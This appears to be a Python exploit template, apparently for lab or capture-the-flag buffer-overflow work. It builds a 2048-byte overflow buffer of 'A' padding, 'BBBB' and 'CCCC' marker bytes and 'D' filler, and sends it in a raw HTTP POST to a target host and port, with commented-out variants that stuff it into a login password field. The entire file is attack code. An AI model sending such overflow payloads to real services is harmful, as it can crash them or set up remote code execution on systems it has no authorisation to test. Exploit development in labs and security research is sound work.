#!/usr/bin/env python3
import socket
__author__ = "oats"

#target_ip = "10.0.2.70"
#target_port = 3000
target_ip = "localhost"
target_port = 8888

# handle large responses
def recvall(sock):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = sock.recv(BUFF_SIZE)
        if not part: # no more data
            break
        data += part
    return data

# customize
buffer_size = 2048
offset = 1024

buf = b""
buf += b"A" * offset
buf += b"BBBB"
buf += b"CCCC"
buf += b"D" * (buffer_size - len(buf))

#payload = b'{"username":"admin","password":"' + buf + b'"}'  # json
#payload = b"username=admin&password=" + buf                  # url-encoded
payload = buf

req = b""
req += b"POST / HTTP/1.1\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n" # b"Content-Type: application/json\r\n"
req += "Content-Length: {}\r\n".format(len(payload)).encode()
req += b"Connection: close\r\n"
req += b"\r\n"
req += payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(req)

response = recvall(s).decode()
print(response)
